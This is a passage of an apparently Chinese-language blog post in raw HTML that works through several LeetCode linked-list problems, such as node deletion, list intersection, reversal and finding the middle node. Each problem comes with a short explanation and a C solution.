rel="noopener">https://leetcode-cn.com/problems/shan-chu-lian-biao-de-jie-dian-lcof</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>大致思路如下：</p><ul><li><strong>如果head是那个要被删除的结点，直接返回head的next结点</strong></li><li><strong>使用一个指针ptr遍历链表，如果ptr的next结点是要被删除的结点，直接让ptr的next指向ptr-&gt;next-&gt;next并返回head即可</strong></li></ul><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">struct ListNode* <span class="title">deleteNode</span><span class="params">(struct ListNode* head, <span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">retn</span> = <span class="title">head</span>;</span></span><br><span class="line">    <span class="keyword">if</span>(head-&gt;val == val)</span><br><span class="line">        <span class="keyword">return</span> head-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(head-&gt;next-&gt;val == val)</span><br><span class="line">        &#123;</span><br><span class="line">            head-&gt;next = head-&gt;next-&gt;next;</span><br><span class="line">            <span class="keyword">return</span> retn;</span><br><span class="line">        &#125;</span><br><span class="line">        head = head-&gt;next;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/21/eX5UEyjCQvBDPIn.png" alt="image.png"></p><h2 id="0x08-剑指-Offer-52-两个链表的第一个公共节点"><a href="#0x08-剑指-Offer-52-两个链表的第一个公共节点" class="headerlink" title="0x08.剑指 Offer 52. 两个链表的第一个公共节点"></a>0x08.<a href="https://leetcode-cn.com/problems/liang-ge-lian-biao-de-di-yi-ge-gong-gong-jie-dian-lcof/" target="_blank" rel="noopener">剑指 Offer 52. 两个链表的第一个公共节点</a></h2><blockquote><p>输入两个链表，找出它们的第一个公共节点。</p><p>如下面的两个链表：</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/14/160_statement.png" alt="image.png"></p><p>在节点 c1 开始相交。</p><p>示例 1：</p><p><img src="https://assets.leetcode.com/uploads/2018/12/13/160_example_1.png" alt="image.png"></p><p>输入：intersectVal = 8, listA = [4,1,8,4,5], listB = [5,0,1,8,4,5], skipA = 2, skipB = 3<br>输出：Reference of the node with value = 8<br>输入解释：相交节点的值为 8 （注意，如果两个列表相交则不能为 0）。从各自的表头开始算起，链表 A 为 [4,1,8,4,5]，链表 B 为 [5,0,1,8,4,5]。在 A 中，相交节点前有 2 个节点；在 B 中，相交节点前有 3 个节点。</p><p>示例 2：</p><p><img src="https://assets.leetcode.com/uploads/2018/12/13/160_example_2.png" alt="image.png"></p><p>输入：intersectVal = 2, listA = [0,9,1,2,4], listB = [3,2,4], skipA = 3, skipB = 1<br>输出：Reference of the node with value = 2<br>输入解释：相交节点的值为 2 （注意，如果两个列表相交则不能为 0）。从各自的表头开始算起，链表 A 为 [0,9,1,2,4]，链表 B 为 [3,2,4]。在 A 中，相交节点前有 3 个节点；在 B 中，相交节点前有 1 个节点。</p><p>示例 3：</p><p><img src="https://assets.leetcode.com/uploads/2018/12/13/160_example_3.png" alt="image.png"></p><p>输入：intersectVal = 0, listA = [2,6,4], listB = [1,5], skipA = 3, skipB = 2<br>输出：null<br>输入解释：从各自的表头开始算起，链表 A 为 [2,6,4]，链表 B 为 [1,5]。由于这两个链表不相交，所以 intersectVal 必须为 0，而 skipA 和 skipB 可以是任意值。<br>解释：这两个链表不相交，因此返回 null。</p><p>注意：</p><p>如果两个链表没有交点，返回 null.<br>在返回结果后，两个链表仍须保持原有的结构。<br>可假定整个链表结构中没有循环。<br>程序尽量满足 O(n) 时间复杂度，且仅用 O(1) 内存。<br>本题与主站 160 题相同：<a href="https://leetcode-cn.com/problems/intersection-of-two-linked-lists/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/intersection-of-two-linked-lists/</a></p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/liang-ge-lian-biao-de-di-yi-ge-gong-gong-jie-dian-lcof" target="_blank" rel="noopener">https://leetcode-cn.com/problems/liang-ge-lian-biao-de-di-yi-ge-gong-gong-jie-dian-lcof</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><h3 id="解法：双指针-2"><a href="#解法：双指针-2" class="headerlink" title="解法：双指针"></a>解法：双指针</h3><p>我们使用两个指针 node1，node2 分别指向两个链表 headA，headB 的头结点，然后同时分别逐结点遍历，<strong>当 node1 到达链表 headA 的末尾时，重新定位到链表 headB 的头结点；当 node2 到达链表 headB 的末尾时，重新定位到链表 headA 的头结点。</strong></p><p>这样，<strong>当它们相遇时，所指向的结点就是第一个公共结点</strong>。</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">struct ListNode *<span class="title">getIntersectionNode</span><span class="params">(struct ListNode *headA, struct ListNode *headB)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">node1</span> = <span class="title">headA</span>, *<span class="title">node2</span> = <span class="title">headB</span>;</span></span><br><span class="line">    <span class="keyword">while</span> (node1 != node2) </span><br><span class="line">    &#123;</span><br><span class="line">        node1 = node1 != <span class="literal">NULL</span> ? node1-&gt;next : headB;</span><br><span class="line">        node2 = node2 != <span class="literal">NULL</span> ? node2-&gt;next : headA;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> node1;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/21/EmP5ZVfpKBYNDIs.png" alt="image.png"></p><h2 id="0x09-移除链表元素"><a href="#0x09-移除链表元素" class="headerlink" title="0x09.移除链表元素"></a>0x09.<a href="https://leetcode-cn.com/problems/remove-linked-list-elements/" target="_blank" rel="noopener">移除链表元素</a></h2><blockquote><p>删除链表中等于给定值 <strong><em>val\</em></strong> 的所有节点。</p><p><strong>示例:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: 1-&gt;2-&gt;6-&gt;3-&gt;4-&gt;5-&gt;6, val &#x3D; 6</span><br><span class="line">输出: 1-&gt;2-&gt;3-&gt;4-&gt;5</span><br></pre></td></tr></table></figure></blockquote><h3 id="解法：哨兵结点"><a href="#解法：哨兵结点" class="headerlink" title="解法：哨兵结点"></a>解法：哨兵结点</h3><p>分两部分遍历，第一部分遍历把链表从头部开始一直到值非val的所有节点删除，第二部分遍历把后续结点都遍历并删除值为val的结点（将其前一结点的next指针指向该结点的next）</p><p>针对第一部分的特殊性，我们使用一个<strong>哨兵结点指向头结点，最后返回哨兵结点的next即可</strong></p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">struct ListNode* <span class="title">removeElements</span><span class="params">(struct ListNode* head, <span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">temp</span> = (<span class="title">struct</span> <span class="title">ListNode</span>*)<span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">ListNode</span>)), *<span class="title">temp2</span>;</span></span><br><span class="line">    temp-&gt;next = head;</span><br><span class="line">    <span class="keyword">while</span>(temp-&gt;next)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(temp-&gt;next-&gt;val!=val)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        temp-&gt;next = temp-&gt;next-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    temp2 = temp-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(temp2)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(temp2-&gt;next &amp;&amp; temp2-&gt;next-&gt;val == val)</span><br><span class="line">        &#123;</span><br><span class="line">            temp2-&gt;next = temp2-&gt;next-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        temp2 = temp2-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> temp-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/21/XFPBxGio7kvH59N.png" alt="image.png"></p><h2 id="0x0A-剑指-Offer-06-从尾到头打印链表"><a href="#0x0A-剑指-Offer-06-从尾到头打印链表" class="headerlink" title="0x0A.剑指 Offer 06. 从尾到头打印链表"></a>0x0A.<a href="https://leetcode-cn.com/problems/cong-wei-dao-tou-da-yin-lian-biao-lcof/" target="_blank" rel="noopener">剑指 Offer 06. 从尾到头打印链表</a></h2><blockquote><p>输入一个链表的头节点，从尾到头反过来返回每个节点的值（用数组返回）。</p><p>示例 1：</p><p>输入：head = [1,3,2]<br>输出：[2,3,1]</p><p>限制：</p><p>0 &lt;= 链表长度 &lt;= 10000</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/cong-wei-dao-tou-da-yin-lian-biao-lcof" target="_blank" rel="noopener">https://leetcode-cn.com/problems/cong-wei-dao-tou-da-yin-lian-biao-lcof</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><h3 id="解法：递归"><a href="#解法：递归" class="headerlink" title="解法：递归"></a>解法：递归</h3><p>直接递归从最后一个结点开始输出即可</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">reversePrint</span><span class="params">(struct ListNode* head, <span class="keyword">int</span>* returnSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!head)</span><br><span class="line">    &#123;</span><br><span class="line">        *returnSize = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*<span class="number">10000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> * temp = reversePrint(head-&gt;next, returnSize);</span><br><span class="line">    temp[(*returnSize)++] = head-&gt;val;</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，递归以及提前分配数组空间会占用大量空间</p><p><img src="https://s1.ax1x.com/2020/09/23/wXRs4f.png" alt="wXRs4f.png"></p><h3 id="优化解法：链表重构"><a href="#优化解法：链表重构" class="headerlink" title="优化解法：链表重构"></a>优化解法：链表重构</h3><p>为了避免递归产生的大量栈空间以及提前分配大数组占用的大空间，我们考虑<strong>将链表重构为其逆序链表后再从头开始输出即可</strong>，重构期间同时也能统计链表长度，避免大量无用空间被占用</p><p>当然，因为要遍历两趟链表，所以花费的时间会比初始解法长一些</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">reversePrint</span><span class="params">(struct ListNode* head, <span class="keyword">int</span>* returnSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *returnSize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(!head) </span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*<span class="number">5</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">temp</span> = <span class="title">NULL</span>, *<span class="title">temp2</span>;</span></span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(head)</span><br><span class="line">    &#123;</span><br><span class="line">        temp2 = head-&gt;next;</span><br><span class="line">        head-&gt;next = temp;</span><br><span class="line">        temp = head;</span><br><span class="line">        head = temp2;</span><br><span class="line">        n++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> * retn = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*(n+<span class="number">5</span>));</span><br><span class="line">    <span class="keyword">while</span>(temp)</span><br><span class="line">    &#123;</span><br><span class="line">        retn[(*returnSize)++] = temp-&gt;val;</span><br><span class="line">        temp = temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> retn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/23/wXW9PK.png" alt="wXW9PK.png"></p><h2 id="0x0B-剑指-Offer-24-反转链表"><a href="#0x0B-剑指-Offer-24-反转链表" class="headerlink" title="0x0B.剑指 Offer 24. 反转链表"></a>0x0B.<a href="https://leetcode-cn.com/problems/fan-zhuan-lian-biao-lcof/" target="_blank" rel="noopener">剑指 Offer 24. 反转链表</a></h2><blockquote><p>定义一个函数，输入一个链表的头节点，反转该链表并输出反转后链表的头节点。</p><p>示例:</p><p>输入: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL<br>输出: 5-&gt;4-&gt;3-&gt;2-&gt;1-&gt;NULL</p><p>限制：</p><p>0 &lt;= 节点个数 &lt;= 5000</p><p>注意：本题与主站 206 题相同：<a href="https://leetcode-cn.com/problems/reverse-linked-list/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/reverse-linked-list/</a></p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/fan-zhuan-lian-biao-lcof" target="_blank" rel="noopener">https://leetcode-cn.com/problems/fan-zhuan-lian-biao-lcof</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>直接把前一题重构链表的代码搬过来即可（其实这题就是【简单】0x01啊</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">struct ListNode* <span class="title">reverseList</span><span class="params">(struct ListNode* head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">temp</span> = <span class="title">NULL</span>, *<span class="title">temp2</span>;</span></span><br><span class="line">    <span class="keyword">while</span>(head)</span><br><span class="line">    &#123;</span><br><span class="line">        temp2 = head-&gt;next;</span><br><span class="line">        head-&gt;next = temp;</span><br><span class="line">        temp = head;</span><br><span class="line">        head = temp2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/23/wXWrL9.png" alt="wXWrL9.png"></p><h2 id="0x0C-链表的中间结点"><a href="#0x0C-链表的中间结点" class="headerlink" title="0x0C.链表的中间结点"></a>0x0C.<a href="https://leetcode-cn.com/problems/middle-of-the-linked-list/" target="_blank" rel="noopener">链表的中间结点</a></h2><blockquote><p>给定一个带有头结点 head 的非空单链表，返回链表的中间结点。</p><p>如果有两个中间结点，则返回第二个中间结点。</p><p>示例 1：</p><p>输入：[1,2,3,4,5]<br>输出：此列表中的结点 3 (序列化形式：[3,4,5])<br>返回的结点值为 3 。 (测评系统对该结点序列化表述是 [3,4,5])。<br>注意，我们返回了一个 ListNode 类型的对象 ans，这样：<br>ans.val = 3, ans.next.val = 4, ans.next.next.val = 5, 以及 ans.next.next.next = NULL.<br>示例 2：</p><p>输入：[1,2,3,4,5,6]<br>输出：此列表中的结点 4 (序列化形式：[4,5,6])<br>由于该列表有两个中间结点，值分别为 3 和 4，我们返回第二个结点。</p><p>提示：</p><p>给定链表的结点数介于 1 和 100 之间。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/middle-of-the-linked-list" target="_blank" rel="noopener">https://leetcode-cn.com/problems/middle-of-the-linked-list</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><h3 id="解法：快慢指针"><a href="#解法：快慢指针" class="headerlink" title="解法：快慢指针"></a>解法：快慢指针</h3><p>初始时将<strong>慢指针设为head，快指针设为head-&gt;next</strong></p><p><strong>慢指针一次走一步， 快指针一次走两步， 快指针为NULL时返回慢指针即可</strong></p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">struct ListNode* <span class="title">middleNode</span><span class="params">(struct ListNode* head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!head)</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">temp</span> = <span class="title">head</span>-&gt;<span class="title">next</span>;</span></span><br><span class="line">    <span class="keyword">while</span>(temp)</span><br><span class="line">    &#123;</span><br><span class="line">        head = head-&gt;next;</span><br><span class="line">        temp = temp-&gt;next;</span><br><span class="line">        <span class="keyword">if</span>(!temp)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        temp = temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/23/wXWTeA.png" alt="wXWTeA.png"></p><h2 id="0x0D-相交链表"><a href="#0x0D-相交链表" class="headerlink" title="0x0D.相交链表"></a>0x0D.<a href="https://leetcode-cn.com/problems/intersection-of-two-linked-lists/" target="_blank" rel="noopener">相交链表</a></h2><blockquote><p>编写一个程序，找到两个单链表相交的起始节点。</p><p>如下面的两个链表：</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/14/160_statement.png" alt="image.png"></p><p>在节点 c1 开始相交。</p><p>示例 1：</p><p><img src="https://assets.leetcode.com/uploads/2018/12/13/160_example_1.png" alt="image.png"></p><p>输入：intersectVal = 8, listA = [4,1,8,4,5], listB = [5,0,1,8,4,5], skipA = 2, skipB = 3<br>输出：Reference of the node with value = 8<br>输入解释：相交节点的值为 8 （注意，如果两个链表相交则不能为 0）。从各自的表头开始算起，链表 A 为 [4,1,8,4,5]，链表 B 为 [5,0,1,8,4,5]。在 A 中，相交节点前有 2 个节点；在 B 中，相交节点前有 3 个节点。</p><p>示例 2：</p><p><img src="https://assets.leetcode.com/uploads/2018/12/13/160_example_2.png" alt="image.png"></p><p>输入：intersectVal = 2, listA = [0,9,1,2,4], listB = [3,2,4], skipA = 3, skipB = 1<br>输出：Reference of the node with value = 2<br>输入解释：相交节点的值为 2 （注意，如果两个链表相交则不能为 0）。从各自的表头开始算起，链表 A 为 [0,9,1,2,4]，链表 B 为 [3,2,4]。在 A 中，相交节点前有 3 个节点；在 B 中，相交节点前有 1 个节点。</p><p>示例 3：</p><p><img src="https://assets.leetcode.com/uploads/2018/12/13/160_example_3.png" alt="image.png"></p><p>输入：intersectVal = 0, listA = [2,6,4], listB = [1,5], skipA = 3, skipB = 2<br>输出：null<br>输入解释：从各自的表头开始算起，链表 A 为 [2,6,4]，链表 B 为 [1,5]。由于这两个链表不相交，所以 intersectVal 必须为 0，而 skipA 和 skipB 可以是任意值。<br>解释：这两个链表不相交，因此返回 null。</p><p>注意：</p><p>如果两个链表没有交点，返回 null.<br>在返回结果后，两个链表仍须保持原有的结构。<br>可假定整个链表结构中没有循环。<br>程序尽量满足 O(n) 时间复杂度，且仅用 O(1) 内存。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/intersection-of-two-linked-lists" target="_blank" rel="noopener">https://leetcode-cn.com/problems/intersection-of-two-linked-lists</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>这道题和【简单】0x08一样，直接套就完事了</p><h3 id="解法：双指针-3"><a href="#解法：双指针-3" class="headerlink" title="解法：双指针"></a>解法：双指针</h3><p>我们使用两个指针 node1，node2 分别指向两个链表 headA，headB 的头结点，然后同时分别逐结点遍历，<strong>当 node1 到达链表 headA 的末尾时，重新定位到链表 headB 的头结点；当 node2 到达链表 headB 的末尾时，重新定位到链表 headA 的头结点。</strong></p><p>这样，<strong>当它们相遇时，所指向的结点就是第一个公共结点</strong>。</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">struct ListNode *<span class="title">getIntersectionNode</span><span class="params">(struct ListNode *headA, struct ListNode *headB)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">node1</span> = <span class="title">headA</span>, *<span class="title">node2</span> = <span class="title">headB</span>;</span></span><br><span class="line">    <span class="keyword">while</span>(node1!=node2)</span><br><span class="line">    &#123;</span><br><span class="line">        node1 = !node1 ? headB : node1-&gt;next;</span><br><span class="line">        node2 = !node2 ? headA : node2-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> node1;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/23/wXWqFP.png" alt="wXWqFP.png"></p><h2 id="0x0E-面试题-02-07-链表相交"><a href="#0x0E-面试题-02-07-链表相交" class="headerlink" title="0x0E.面试题 02.07. 链表相交"></a>0x0E.<a href="https://leetcode-cn.com/problems/intersection-of-two-linked-lists-lcci/" target="_blank" rel="noopener">面试题 02.07. 